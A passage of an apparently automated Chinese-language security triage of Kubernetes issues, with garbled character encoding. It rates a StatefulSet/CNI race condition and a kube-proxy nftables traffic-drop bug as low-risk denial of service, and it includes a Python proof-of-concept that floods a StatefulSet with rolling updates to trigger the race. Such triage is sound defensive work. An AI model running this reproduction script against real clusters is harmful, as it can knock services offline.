2.  **StatefulSetç‰¹æ€§**ï¼šStatefulSetåœ¨æ»šåŠ¨æ›´æ–°æ—¶ï¼Œä¼šå…ˆç»ˆæ­¢æ—§Podï¼ˆä¾‹å¦‚`pod-0`ï¼‰ï¼Œç„¶ååˆ›å»ºä¸€ä¸ªåŒåçš„æ–°Podï¼ˆæ–°çš„`pod-0`ï¼‰ã€‚
3.  **CNIæ’ä»¶è¡Œä¸º**ï¼šåƒCalicoè¿™æ ·çš„CNIæ’ä»¶ï¼Œé€šå¸¸ä¼šæ ¹æ®Podçš„`namespace`å’Œ`name`æ¥ç”Ÿæˆç½‘ç»œè®¾å¤‡åï¼ˆå¦‚veth pairï¼‰ã€‚å› ä¸ºæ–°æ—§Podçš„`namespace`å’Œ`name`å®Œå…¨ç›¸åŒï¼Œæ‰€ä»¥å®ƒä»¬ä¼šå¯¹åº”åˆ°åŒä¸€ä¸ªvethè®¾å¤‡åã€‚
4.  **ç«æ€æ¡ä»¶**ï¼š
    *   StatefulSetæ§åˆ¶å™¨å‘èµ·æ»šåŠ¨æ›´æ–°ï¼Œæ—§Podè¿›å…¥`Terminating`çŠ¶æ€ã€‚
    *   åœ¨æ—§Podçš„ç½‘ç»œèµ„æºï¼ˆç”±CNIæ’ä»¶ç®¡ç†ï¼‰è¢«å®Œå…¨æ¸…ç†ï¼ˆCNI `cmdDel`ï¼‰ä¹‹å‰ï¼ŒPodåƒåœ¾å›æ”¶å™¨å› ä¸ºè¾¾åˆ°é˜ˆå€¼è€Œå¼ºåˆ¶ä»etcdä¸­åˆ é™¤äº†æ—§Podçš„APIå¯¹è±¡ã€‚
    *   StatefulSetæ§åˆ¶å™¨è®¤ä¸ºæ—§Podå·²åˆ é™¤ï¼Œäºæ˜¯åˆ›å»ºäº†æ–°Podã€‚
    *   æ–°Podå¯åŠ¨ï¼Œå…¶CNI `cmdAdd`è¿‡ç¨‹å¼€å§‹æ‰§è¡Œï¼Œåˆ›å»ºäº†æ–°çš„ç½‘ç»œè®¾å¤‡ã€‚
    *   æ­¤æ—¶ï¼Œæ—§Podå»¶è¿Ÿçš„CNI `cmdDel`æ¸…ç†æ“ä½œç»ˆäºå¼€å§‹æ‰§è¡Œã€‚ç”±äºvethè®¾å¤‡åå†²çªï¼Œè¿™ä¸ªæ¸…ç†æ“ä½œé”™è¯¯åœ°åˆ é™¤äº†å±äº**æ–°Pod**çš„ç½‘ç»œè®¾å¤‡ã€‚
5.  **æœ€ç»ˆå½±å“**ï¼šæ–°åˆ›å»ºçš„Podå¤±å»äº†ç½‘ç»œè¿æ¥ï¼Œå¯¼è‡´æœåŠ¡ä¸å¯ç”¨ã€‚è¿™å®è´¨ä¸Šæ˜¯ä¸€ç§é’ˆå¯¹ç‰¹å®šåº”ç”¨æœåŠ¡çš„æ‹’ç»æœåŠ¡ï¼ˆDenial of Service, DoSï¼‰æ”»å‡»ã€‚

ä»å®‰å…¨è§’åº¦çœ‹ï¼Œè¿™æ˜¯ä¸€ä¸ªå¯ç”¨æ€§é—®é¢˜ã€‚æ”»å‡»è€…å¦‚æœæ‹¥æœ‰åœ¨é›†ç¾¤ä¸­æ›´æ–°StatefulSetçš„æƒé™ï¼Œå¯ä»¥å°è¯•é€šè¿‡é¢‘ç¹æ›´æ–°æ¥è§¦å‘æ­¤æ¡ä»¶ï¼Œä»è€Œå¯¼è‡´ç›®æ ‡æœåŠ¡ä¸­æ–­ã€‚ç„¶è€Œï¼Œè¿™ç§æ”»å‡»çš„æˆåŠŸä¾èµ–äºå¤šä¸ªå‰ææ¡ä»¶ï¼š
*   æ”»å‡»è€…éœ€è¦æ‹¥æœ‰å¯¹ç›®æ ‡StatefulSetçš„`update`æƒé™ï¼Œè¿™é€šå¸¸æ˜¯ç®¡ç†å‘˜æˆ–CI/CDç­‰é«˜æƒé™è´¦æˆ·æ‰å…·å¤‡çš„ã€‚
*   é›†ç¾¤çš„`--terminated-pod-gc-threshold`éœ€è¦è®¾ç½®å¾—è¾ƒä½ï¼Œæˆ–è€…é›†ç¾¤æ­£å¤„äºé«˜è´Ÿè½½çŠ¶æ€ï¼Œå¯¼è‡´å¤§é‡Podå¤„äº`Terminating`çŠ¶æ€ã€‚
*   æ”»å‡»çš„æˆåŠŸå…·æœ‰ä¸€å®šçš„å¶ç„¶æ€§ï¼Œä¾èµ–äºç«æ€æ¡ä»¶çš„å‘ç”Ÿã€‚

æ ¹æ®CVSS 3.1æ ‡å‡†è¿›è¡Œè¯„ä¼°ï¼š
*   **Attack Vector (AV): Network (N)**ï¼šæ”»å‡»è€…é€šè¿‡K8s APIå‘èµ·æ”»å‡»ã€‚
*   **Attack Complexity (AC): High (H)**ï¼šéœ€è¦æ»¡è¶³ç‰¹å®šçš„é›†ç¾¤é…ç½®ï¼ˆGCé˜ˆå€¼ï¼‰å’ŒçŠ¶æ€ï¼ˆé«˜è´Ÿè½½ï¼‰ï¼Œå¹¶ä¸”éœ€è¦ç²¾ç¡®æŠŠæ¡æ—¶æœºï¼Œåˆ©ç”¨éš¾åº¦é«˜ã€‚
*   **Privileges Required (PR): High (H)**ï¼šéœ€è¦èƒ½å¤Ÿæ›´æ–°StatefulSetçš„æƒé™ï¼Œå±äºé«˜æƒé™æ“ä½œã€‚
*   **User Interaction (UI): None (N)**ï¼šæ— éœ€ç”¨æˆ·äº¤äº’ã€‚
*   **Scope (S): Unchanged (U)**ï¼šæ¼æ´å½±å“èŒƒå›´æœªè¶…å‡ºå½“å‰å®‰å…¨åŸŸã€‚
*   **Confidentiality (C): None (N)**ï¼šä¸å½±å“æœºå¯†æ€§ã€‚
*   **Integrity (I): None (N)**ï¼šä¸å½±å“å®Œæ•´æ€§ã€‚
*   **Availability (A): Low (L)**ï¼šå½±å“çš„æ˜¯è¢«æ›´æ–°çš„StatefulSetä¸­çš„Podï¼Œé€ æˆå±€éƒ¨ã€æš‚æ—¶çš„æœåŠ¡ä¸­æ–­ï¼Œä¸ä¼šå¯¼è‡´æ•´ä¸ªé›†ç¾¤ç˜«ç—ªã€‚

ç»¼åˆè¯„åˆ†ä¸º **2.2 (Low)**ã€‚æ ¹æ®åˆ¤æ–­æ ‡å‡†ç¬¬5æ¡ï¼Œç”±äºæ¼æ´åˆ©ç”¨éœ€è¦æ”»å‡»è€…å…·å¤‡`update`ç­‰éåªè¯»æƒé™ï¼Œä¸”å½±å“ä¸ºæœ‰é™çš„DoSï¼Œå› æ­¤ä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import time
import uuid
import logging
from kubernetes import client, config
from kubernetes.client.rest import ApiException
import sys
import threading

# é…ç½®æ—¥å¿—
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# --- é…ç½®å‚æ•° ---
NAMESPACE = "poc-sts-race-" + str(uuid.uuid4())[:8]
STATEFULSET_NAME = "web"
# ä½¿ç”¨ä¸€ä¸ªè½»é‡çº§çš„é•œåƒ
IMAGE_NAME = "nginx:1.25"
POC_DURATION_SECONDS = 90  # POC è„šæœ¬æ€»æ‰§è¡Œæ—¶é•¿

def setup_kubernetes_client():
    """åŠ è½½ kubeconfig å¹¶è¿”å› API å®¢æˆ·ç«¯å®ä¾‹"""
    try:
        config.load_kube_config()
        core_v1 = client.CoreV1Api()
        apps_v1 = client.AppsV1Api()
        return core_v1, apps_v1
    except Exception as e:
        logging.error(f"æ— æ³•åŠ è½½ Kubernetes é…ç½®: {e}")
        sys.exit(1)

def create_namespace(api_instance):
    """åˆ›å»ºç”¨äºæµ‹è¯•çš„å‘½åç©ºé—´"""
    namespace_manifest = {
        "apiVersion": "v1",
        "kind": "Namespace",
        "metadata": {
            "name": NAMESPACE
        }
    }
    try:
        logging.info(f"æ­£åœ¨åˆ›å»ºå‘½åç©ºé—´: {NAMESPACE}...")
        api_instance.create_namespace(body=namespace_manifest)
        logging.info(f"å‘½åç©ºé—´ '{NAMESPACE}' åˆ›å»ºæˆåŠŸã€‚")
    except ApiException as e:
        if e.status == 409:
            logging.warning(f"å‘½åç©ºé—´ '{NAMESPACE}' å·²å­˜åœ¨ã€‚")
        else:
            logging.error(f"åˆ›å»ºå‘½åç©ºé—´å¤±è´¥: {e}")
            raise

def create_statefulset(api_instance):
    """åˆ›å»º StatefulSet"""
    sts_manifest = {
        "apiVersion": "apps/v1",
        "kind": "StatefulSet",
        "metadata": {
            "name": STATEFULSET_NAME,
            "namespace": NAMESPACE
        },
        "spec": {
            "selector": {
                "matchLabels": {
                    "app": "nginx"
                }
            },
            "serviceName": "nginx",
            "replicas": 1,
            "template": {
                "metadata": {
                    "labels": {
                        "app": "nginx"
                    }
                },
                "spec": {
                    "terminationGracePeriodSeconds": 10,
                    "containers": [{
                        "name": "nginx",
                        "image": IMAGE_NAME,
                        "ports": [{
                            "containerPort": 80,
                            "name": "web"
                        }]
                    }]
                }
            }
        }
    }
    try:
        logging.info(f"æ­£åœ¨åˆ›å»º StatefulSet '{STATEFULSET_NAME}'...")
        api_instance.create_namespaced_stateful_set(namespace=NAMESPACE, body=sts_manifest)
        
        # ç­‰å¾… StatefulSet å‡†å¤‡å°±ç»ª
        wait_for_sts_ready(api_instance)
        
    except ApiException as e:
        logging.error(f"åˆ›å»º StatefulSet å¤±è´¥: {e}")
        raise

def wait_for_sts_ready(api_instance):
    """ç­‰å¾… StatefulSet çš„ Pod å‡†å¤‡å°±ç»ª"""
    logging.info("ç­‰å¾… StatefulSet Pod å‡†å¤‡å°±ç»ª...")
    start_time = time.time()
    while time.time() - start_time < 120: # æœ€å¤šç­‰å¾…2åˆ†é’Ÿ
        try:
            sts = api_instance.read_namespaced_stateful_set(name=STATEFULSET_NAME, namespace=NAMESPACE)
            if sts.status.ready_replicas is not None and sts.status.ready_replicas == sts.spec.replicas:
                logging.info(f"StatefulSet '{STATEFULSET_NAME}' å·²å‡†å¤‡å°±ç»ªã€‚")
                return
        except ApiException:
            # å¯èƒ½ä¼šåœ¨åˆ›å»ºåˆæœŸæŸ¥è¯¢å¤±è´¥ï¼Œå¿½ç•¥
            pass
        time.sleep(5)
    raise TimeoutError("ç­‰å¾… StatefulSet å‡†å¤‡å°±ç»ªè¶…æ—¶ã€‚")


def trigger_rolling_updates(api_instance, stop_event):
    """é€šè¿‡ä¿®æ”¹æ³¨è§£æ¥å¾ªç¯è§¦å‘ StatefulSet çš„æ»šåŠ¨æ›´æ–°"""
    logging.info("å¼€å§‹å¾ªç¯è§¦å‘æ»šåŠ¨æ›´æ–°ä»¥æ¨¡æ‹Ÿç«æ€æ¡ä»¶...")
    while not stop_event.is_set():
        try:
            patch_body = {
                "spec": {
                    "template": {
                        "metadata": {
                            "annotations": {
                                "poc-update-trigger": str(uuid.uuid4())
                            }
                        }
                    }
                }
            }
            api_instance.patch_namespaced_stateful_set(
                name=STATEFULSET_NAME,
                namespace=NAMESPACE,
                body=patch_body
            )
            logging.info(f"å·²è§¦å‘å¯¹ '{STATEFULSET_NAME}' çš„æ›´æ–°ã€‚")
            # çŸ­æš‚ä¼‘çœ ä»¥å…è®¸æ›´æ–°å¼€å§‹ï¼Œå¹¶å¿«é€Ÿè¿›è¡Œä¸‹ä¸€æ¬¡æ›´æ–°ä»¥å¢åŠ å‹åŠ›
            time.sleep(1) 
        except ApiException as e:
            if e.status == 404:
                logging.warning("StatefulSet ä¸å†å­˜åœ¨ï¼Œåœæ­¢æ›´æ–°ã€‚")
                break
            logging.error(f"æ›´æ–° StatefulSet å¤±è´¥: {e}")
        except Exception as e:
            logging.error(f"å‘ç”Ÿæ„å¤–é”™è¯¯: {e}")
            break

def check_pod_status(core_api, stop_event):
    """å®šæœŸæ£€æŸ¥PodçŠ¶æ€ï¼Œå¯»æ‰¾ç½‘ç»œä¸­æ–­çš„è¿¹è±¡"""
    pod_name = f"{STATEFULSET_NAME}-0"
    while not stop_event.is_set():
        try:
            pod = core_api.read_namespaced_pod(name=pod_name, namespace=NAMESPACE)
            is_ready = any(condition.status == "True" for condition in pod.status.conditions if condition.type == "Ready")
            if pod.status.phase == "Running" and not is_ready:
                logging.warning(f"æ£€æµ‹åˆ°æ½œåœ¨é—®é¢˜ï¼šPod '{pod_name}' å¤„äº Running çŠ¶æ€ä½† NotReadyã€‚")
                logging.warning("è¿™å¯èƒ½è¡¨ç¤ºç”±äºç«æ€æ¡ä»¶å¯¼è‡´çš„ç½‘ç»œè¿æ¥ä¸¢å¤±ã€‚è¯·æ‰‹åŠ¨æ£€æŸ¥Podäº‹ä»¶å’Œç½‘ç»œã€‚")
                # å¯ä»¥è¿›ä¸€æ­¥æ£€æŸ¥Podäº‹ä»¶æ¥ç¡®è®¤
                events = core_api.list_namespaced_event(namespace=NAMESPACE, field_selector=f"involvedObject.name={pod_name}")
                for event in events.items:
                    if "failed" in event.reason.lower() or "unhealthy" in event.reason.lower():
                         logging.warning(f"ç›¸å…³äº‹ä»¶: {event.reason} - {event.message}")

        except ApiException as e:
            if e.status != 404:
                logging.debug(f"æ£€æŸ¥ Pod çŠ¶æ€æ—¶å‡ºé”™: {e}")
        time.sleep(5)

def cleanup(core_api, apps_api):
    """æ¸…ç†æµ‹è¯•èµ„æº"""
    logging.info("å¼€å§‹æ¸…ç†èµ„æº...")
    try:
        logging.info(f"æ­£åœ¨åˆ é™¤ StatefulSet '{STATEFULSET_NAME}'...")
        apps_api.delete_namespaced_stateful_set(
            name=STATEFULSET_NAME,
            namespace=NAMESPACE,
            body=client.V1DeleteOptions(propagation_policy='Foreground')
        )
    except ApiException as e:
        if e.status != 404:
            logging.error(f"åˆ é™¤ StatefulSet å¤±è´¥: {e}")

    try:
        logging.info(f"æ­£åœ¨åˆ é™¤å‘½åç©ºé—´ '{NAMESPACE}'...")
        core_api.delete_namespace(name=NAMESPACE)
        logging.info("ç­‰å¾…å‘½åç©ºé—´åˆ é™¤å®Œæˆ...")
        start_time = time.time()
        while time.time() - start_time < 120:
             try:
                 core_api.read_namespace(name=NAMESPACE)
                 time.sleep(5)
             except ApiException as e:
                 if e.status == 404:
                     logging.info(f"å‘½åç©ºé—´ '{NAMESPACE}' å·²æˆåŠŸåˆ é™¤ã€‚")
                     return
        logging.warning("åˆ é™¤å‘½åç©ºé—´è¶…æ—¶ã€‚")
    except ApiException as e:
        if e.status != 404:
            logging.error(f"åˆ é™¤å‘½åç©ºé—´å¤±è´¥: {e}")

def main():
    """ä¸»æ‰§è¡Œå‡½æ•°"""
    print("="*60)
    print("é‡è¦æç¤ºï¼šæ­¤POCæ—¨åœ¨å¤ç°ä¸€ä¸ªç«æ€æ¡ä»¶æ¼æ´ã€‚")
    print("æˆåŠŸå¤ç°ä¾èµ–äºä¸€ä¸ªå…³é”®çš„é›†ç¾¤é…ç½®ï¼š")
    print("kube-controller-manager çš„ `--terminated-pod-gc-threshold` å‚æ•°")
    print("å¿…é¡»è®¾ç½®ä¸ºä¸€ä¸ªéå¸¸å°çš„å€¼ï¼ˆä¾‹å¦‚ 1 æˆ– 0ï¼‰ã€‚")
    print("å¦‚æœæœªè¿›è¡Œæ­¤é…ç½®ï¼Œè„šæœ¬å°†æ— æ³•è§¦å‘è¯¥æ¼æ´ã€‚")
    print("="*60)
    
    core_v1, apps_v1 = setup_kubernetes_client()
    
    stop_event = threading.Event()
    
    try:
        create_namespace(core_v1)
        create_statefulset(apps_v1)
        
        # å¯åŠ¨åå°çº¿ç¨‹æ¥è§¦å‘æ›´æ–°å’Œç›‘æ§
        update_thread = threading.Thread(target=trigger_rolling_updates, args=(apps_v1, stop_event))
        monitor_thread = threading.Thread(target=check_pod_status, args=(core_v1, stop_event))
        
        update_thread.start()
        monitor_thread.start()

        logging.info(f"POC å°†è¿è¡Œ {POC_DURATION_SECONDS} ç§’ã€‚è¯·è§‚å¯Ÿæ—¥å¿—...")
        time.sleep(POC_DURATION_SECONDS)

        logging.info("POC è¿è¡Œæ—¶é—´åˆ°ï¼Œæ­£åœ¨åœæ­¢...")
        stop_event.set()
        
        update_thread.join()
        monitor_thread.join()
        
        logging.info("æœ€ç»ˆæ£€æŸ¥ Pod çŠ¶æ€...")
        check_pod_status(core_v1, threading.Event()) # æœ€åæ£€æŸ¥ä¸€æ¬¡
        
    except Exception as e:
        logging.error(f"POC æ‰§è¡Œè¿‡ç¨‹ä¸­å‘ç”Ÿé”™è¯¯: {e}")
    finally:
        cleanup(core_v1, apps_v1)
        logging.info("POC æ‰§è¡Œå®Œæ¯•ã€‚")

# ç›´æ¥æ‰§è¡Œmainå‡½æ•°
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥Pythonè„šæœ¬é€šè¿‡æ¨¡æ‹ŸStatefulSetçš„å¿«é€Ÿæ»šåŠ¨æ›´æ–°ï¼Œå°è¯•åœ¨é…ç½®ä¸å½“çš„Kubernetesé›†ç¾¤ä¸­å¤ç°Issueä¸­æè¿°çš„ç«æ€æ¡ä»¶ã€‚

**é‡è¦å‰æ**:
æ­¤æ¼æ´çš„å¤ç°æœ‰ä¸€ä¸ª**å…³é”®çš„å¤–éƒ¨ä¾èµ–**ï¼šKubernetesæ§åˆ¶å¹³é¢ç»„ä»¶`kube-controller-manager`çš„å¯åŠ¨å‚æ•°`--terminated-pod-gc-threshold`å¿…é¡»è¢«è®¾ç½®ä¸ºä¸€ä¸ªæå°çš„å€¼ï¼ˆä¾‹å¦‚ï¼Œ`1`ï¼‰ã€‚è¿™æ˜¯ä¸€ä¸ªé›†ç¾¤çº§åˆ«çš„ç®¡ç†å‘˜é…ç½®ï¼Œæ— æ³•é€šè¿‡æœ¬è„šæœ¬åŠ¨æ€ä¿®æ”¹ã€‚**å¦‚æœæ‚¨çš„é›†ç¾¤æœªä½¿ç”¨æ­¤é…ç½®ï¼Œè„šæœ¬å°†æ— æ³•è§¦å‘æ¼æ´ï¼Œä½†å¯ä»¥æ­£å¸¸æ‰§è¡Œå’Œæ¸…ç†ã€‚**

**è„šæœ¬å·¥ä½œæµç¨‹**:
1.  **åˆå§‹åŒ–**:
    *   åŠ è½½æœ¬åœ°`kubeconfig`æ–‡ä»¶ä»¥è·å–ä¸Kubernetesé›†ç¾¤çš„è¿æ¥å‡­è¯ã€‚
    *   åˆ›å»ºä¸€ä¸ªå”¯ä¸€çš„ã€ä¸´æ—¶çš„å‘½åç©ºé—´ï¼ˆå¦‚`poc-sts-race-xxxx`ï¼‰æ¥éš”ç¦»æ‰€æœ‰æ“ä½œï¼Œé¿å…å½±å“é›†ç¾¤ä¸­çš„å…¶ä»–åº”ç”¨ã€‚

2.  **èµ„æºåˆ›å»º**:
    *   åœ¨åˆ›å»ºçš„å‘½åç©ºé—´ä¸­ï¼Œéƒ¨ç½²ä¸€ä¸ªåŒ…å«å•ä¸ªPodå‰¯æœ¬ï¼ˆåŸºäºNginxé•œåƒï¼‰çš„StatefulSetã€‚
    *   è„šæœ¬ä¼šç­‰å¾…StatefulSetåŠå…¶Podå®Œå…¨è¿›å…¥`Ready`çŠ¶æ€åæ‰è¿›è¡Œä¸‹ä¸€æ­¥ã€‚

3.  **è§¦å‘ç«æ€æ¡ä»¶**:
    *   è„šæœ¬å¯åŠ¨ä¸¤ä¸ªå¹¶è¡Œçš„åå°çº¿ç¨‹ï¼š
        *   **æ›´æ–°çº¿ç¨‹ (`trigger_rolling_updates`)**: æ­¤çº¿ç¨‹åœ¨ä¸€ä¸ªå¾ªç¯ä¸­ï¼Œé€šè¿‡`patch`æ“ä½œä¸æ–­ä¿®æ”¹StatefulSetçš„Podæ¨¡æ¿ä¸­çš„ä¸€ä¸ª`annotation`ã€‚æ¯æ¬¡ä¿®æ”¹éƒ½ä¼šè§¦å‘ä¸€æ¬¡æ»šåŠ¨æ›´æ–°ã€‚çŸ­æš‚çš„`sleep(1)`æ˜¯ä¸ºäº†åœ¨é«˜é¢‘ç‡æ›´æ–°å’Œé¿å…å®Œå…¨æ·¹æ²¡API Serverä¹‹é—´å–å¾—å¹³è¡¡ï¼Œç›®çš„æ˜¯äººä¸ºåˆ¶é€ Issueä¸­æè¿°çš„Podåˆ›å»ºå’Œåˆ é™¤å‹åŠ›ã€‚
        *   **ç›‘æ§çº¿ç¨‹ (`check_pod_status`)**: æ­¤çº¿ç¨‹å®šæœŸæ£€æŸ¥StatefulSetçš„Podï¼ˆ`web-0`ï¼‰çš„çŠ¶æ€ã€‚å®ƒå…³æ³¨ä¸€ç§ç‰¹å®šæƒ…å†µï¼šPodå¤„äº`Running`é˜¶æ®µï¼Œä½†å…¶`Ready`çŠ¶æ€ä¸º`False`ã€‚è¿™ç§æƒ…å†µæ˜¯ç½‘ç»œè¿æ¥ä¸¢å¤±çš„å…¸å‹ç—‡çŠ¶ï¼ˆPodå·²å¯åŠ¨ä½†æ— æ³•é€šè¿‡å¥åº·æ£€æŸ¥ï¼‰ã€‚å¦‚æœæ£€æµ‹åˆ°æ­¤æƒ…å†µï¼Œè„šæœ¬ä¼šæ‰“å°è­¦å‘Šä¿¡æ¯ã€‚

4.  **æ‰§è¡Œä¸é€€å‡º**:
    *   ä¸»ç¨‹åºä¼šç­‰å¾…ä¸€ä¸ªå›ºå®šçš„æ—¶é•¿ï¼ˆé»˜è®¤ä¸º90ç§’ï¼‰ï¼Œè®©ä¸Šè¿°ä¸¤ä¸ªçº¿ç¨‹æŒç»­è¿è¡Œã€‚
    *   æ—¶é—´åˆ°è¾¾åï¼Œç¨‹åºä¼šè®¾ç½®ä¸€ä¸ªåœæ­¢äº‹ä»¶ï¼Œé€šçŸ¥åå°çº¿ç¨‹å®‰å…¨é€€å‡ºã€‚

5.  **æ¸…ç†**:
    *   åœ¨è„šæœ¬çš„`finally`å—ä¸­ï¼Œä¼šæ‰§è¡Œæ¸…ç†æ“ä½œï¼Œç¡®ä¿æ— è®ºè„šæœ¬æ˜¯å¦æˆåŠŸè§¦å‘æ¼æ´æˆ–ä¸­é€”å‡ºé”™ï¼Œæ‰€æœ‰åˆ›å»ºçš„èµ„æºï¼ˆStatefulSetå’Œå‘½åç©ºé—´ï¼‰éƒ½ä¼šè¢«å½»åº•åˆ é™¤ï¼Œä¿æŒé›†ç¾¤çš„å¹²å‡€ã€‚

**å¦‚ä½•åˆ¤æ–­å¤ç°æˆåŠŸ**:
åœ¨è„šæœ¬è¿è¡ŒæœŸé—´ï¼Œè§‚å¯Ÿæ—¥å¿—è¾“å‡ºã€‚å¦‚æœçœ‹åˆ°ç±»ä¼¼ä»¥ä¸‹çš„è­¦å‘Šä¿¡æ¯ï¼Œåˆ™è¡¨ç¤ºå¾ˆå¯èƒ½å·²æˆåŠŸå¤ç°è¯¥é—®é¢˜ï¼š
`WARNING - æ£€æµ‹åˆ°æ½œåœ¨é—®é¢˜ï¼šPod 'web-0' å¤„äº Running çŠ¶æ€ä½† NotReadyã€‚`
`WARNING - è¿™å¯èƒ½è¡¨ç¤ºç”±äºç«æ€æ¡ä»¶å¯¼è‡´çš„ç½‘ç»œè¿æ¥ä¸¢å¤±ã€‚è¯·æ‰‹åŠ¨æ£€æŸ¥Podäº‹ä»¶å’Œç½‘ç»œã€‚`
æ­¤æ—¶ï¼Œæ‚¨å¯ä»¥æ‰‹åŠ¨ä½¿ç”¨`kubectl describe pod web-0 -n <namespace>`å’Œ`kubectl get events -n <namespace>`æ¥æŸ¥çœ‹Podçš„è¯¦ç»†çŠ¶æ€å’Œäº‹ä»¶ï¼Œå¯èƒ½ä¼šå‘ç°ä¸ç½‘ç»œå¥åº·æ£€æŸ¥å¤±è´¥ç›¸å…³çš„é”™è¯¯ä¿¡æ¯ã€‚

---


## Issue #131765 kube-proxy: externalTrafficPolicy:Local and proxy-mode=nftables blackholes pods traffic to external IPs

- Issue é“¾æ¥ï¼š[#131765](https://github.com/kubernetes/kubernetes/issues/131765)

### Issue å†…å®¹

#### What happened?

When using kube-proxy on nftables mode and specify a `LoadBalancer` Service with `externalTrafficPolicy:Local` that has an ExternalIP assigned, kube-proxy will create an entry in the kube-proxy ip nftable that will drop traffic to that external IP, like:

```
        map no-endpoint-services {
                type ipv4_addr . inet_proto . inet_service : verdict
                comment "vmap to drop or reject packets to services with no endpoints"
                elements = { 
                             10.88.1.2 . tcp . 80 comment "sys-ingress-priv/internal-ingress-controller-v2:web" : drop,
```

As a result, any pod on the host cannot send traffic to the external IP of the LoadBalancer.

#### What did you expect to happen?

On nodes where no workload is present, traffic should not be dropped but load balanced by kube proxy to the target Service endpoints.
This will also bring consistency with how other modes work, as this issue was addressed both for ipvs (https://github.com/kubernetes/kubernetes/issues/93456)
and iptables (https://github.com/kubernetes/kubernetes/pull/77523) modes.

#### How can we reproduce it (as minimally and precisely as possible)?

Run kube-proxy on nftables mode and try hitting a `LoadBalancer` Service `ExternalIP` from within a pod running in a node that does not have ready endpoints of the target service

#### Anything else we need to know?

@kubernetes/sig-network-bugs
Simmilar to https://github.com/kubernetes/kubernetes/issues/75262 but for `nftables` mode

#### Kubernetes version

<details>

```console
Server Version: v1.33.0
```

</details>

kube-proxy: v1.33.0

#### Cloud provider

aws, gcp and bare metal

#### OS version

_No response_

#### Install tools

_No response_

#### Container runtime (CRI) and version (if applicable)

_No response_

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

_No response_

### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†ä¸€ä¸ªåœ¨ç‰¹å®šé…ç½®ä¸‹çš„ç½‘ç»œè¿æ¥é—®é¢˜ã€‚å½“Kubernetesé›†ç¾¤ä¸­çš„`kube-proxy`ä½¿ç”¨`nftables`æ¨¡å¼ï¼Œå¹¶ä¸”ä¸€ä¸ª`LoadBalancer`ç±»å‹çš„Serviceè®¾ç½®äº†`externalTrafficPolicy: Local`æ—¶ï¼Œ`kube-proxy`ä¼šåœ¨æ²¡æœ‰éƒ¨ç½²è¯¥æœåŠ¡åç«¯Podçš„èŠ‚ç‚¹ä¸Šï¼Œç”Ÿæˆä¸€æ¡`nftables`è§„åˆ™ï¼Œè¯¥è§„åˆ™ä¼š`drop`æ‰æ‰€æœ‰å‘å¾€è¯¥æœåŠ¡`ExternalIP`çš„æµé‡ã€‚è¿™å¯¼è‡´äº†è¿è¡Œåœ¨è¿™äº›èŠ‚ç‚¹ä¸Šçš„Podæ— æ³•è®¿é—®è¯¥`LoadBalancer`æœåŠ¡ã€‚

ä»å®‰å…¨è§’åº¦åˆ†æï¼š
1.  **æ¼æ´ç±»å‹**ï¼šè¿™æ˜¯ä¸€ä¸ªå¯ç”¨æ€§é—®é¢˜ï¼Œå¯ä»¥å½’ç±»ä¸ºæ‹’ç»æœåŠ¡ï¼ˆDenial of Service, DoSï¼‰ã€‚ç‰¹å®šèŠ‚ç‚¹ä¸Šçš„å®¢æˆ·ç«¯ï¼ˆPodsï¼‰æ— æ³•è®¿é—®ç›®æ ‡æœåŠ¡ï¼Œå¯¼è‡´æœåŠ¡å¯¹è¿™éƒ¨åˆ†å®¢æˆ·ç«¯ä¸å¯ç”¨ã€‚
2.  **è§¦å‘æ¡ä»¶**ï¼šè§¦å‘æ­¤é—®é¢˜éœ€è¦æ”»å‡»è€…æ‹¥æœ‰åœ¨Kubernetesé›†ç¾¤ä¸­åˆ›å»ºå’Œä¿®æ”¹`Service`çš„æƒé™ã€‚å…·ä½“æ¥è¯´ï¼Œéœ€è¦èƒ½å¤Ÿåˆ›å»ºä¸€ä¸ª`Type`ä¸º`LoadBalancer`å¹¶è®¾ç½®`externalTrafficPolicy: Local`çš„`Service`ã€‚è¿™é€šå¸¸éœ€è¦`edit`æˆ–æ›´é«˜çš„RBACæƒé™ï¼Œæ™®é€šåªè¯»ç”¨æˆ·æˆ–æ— æƒé™ç”¨æˆ·æ— æ³•è§¦å‘ã€‚
3.  **å½±å“èŒƒå›´**ï¼šå½±å“æ˜¯å±€éƒ¨çš„ï¼Œè€Œéå…¨å±€æ€§çš„ã€‚åªæœ‰è¿è¡Œåœ¨æ²¡æœ‰æœåŠ¡åç«¯Podçš„èŠ‚ç‚¹ä¸Šçš„Podä¼šå—åˆ°å½±å“ã€‚ä»é›†ç¾¤å¤–éƒ¨æˆ–ä»æœ‰æœåŠ¡åç«¯Podçš„èŠ‚ç‚¹ä¸Šè®¿é—®è¯¥æœåŠ¡ä»ç„¶æ˜¯æ­£å¸¸çš„ã€‚å› æ­¤ï¼Œå®ƒä¸ä¼šå¯¼è‡´æœåŠ¡å®Œå…¨ç˜«ç—ªã€‚
4.  **CVSS 3.1 è¯„ä¼°**ï¼š
    *   **Attack Vector (AV): Network (N)** - æ”»å‡»è€…é€šè¿‡Kubernetes APIè¿›è¡Œæ“ä½œã€‚
    *   **Attack Complexity (AC): Low (L)** - åˆ›å»ºä¸€ä¸ªç‰¹å®šé…ç½®çš„Serviceå³å¯ã€‚
    *   **Privileges Required (PR): Low (L)** - éœ€è¦ä¸€ä¸ªæœ‰æƒé™åœ¨å‘½åç©ºé—´å†…åˆ›å»ºServiceçš„ç”¨æˆ·ã€‚è™½ç„¶è¿™ä¸æ˜¯åŒ¿åæƒé™ï¼Œä½†åœ¨CVSSä¸­é€šå¸¸å½’ä¸ºLowï¼Œå› ä¸ºå®ƒä»£è¡¨äº†å·²æˆæƒä½†éç®¡ç†å‘˜çš„ç”¨æˆ·ã€‚
    *   **User Interaction (UI): None (N)** - æ— éœ€ç”¨æˆ·äº¤äº’ã€‚
    *   **Scope (S): Unchanged (U)** - æ¼æ´åˆ©ç”¨ä¸ä¼šå½±å“åˆ°æ§åˆ¶å¹³é¢æˆ–å…¶ä»–ç»„ä»¶çš„å®‰å…¨æ€§ã€‚
    *   **Confidentiality (C): None (N)** - ä¸æ¶‰åŠä¿¡æ¯æ³„éœ²ã€‚
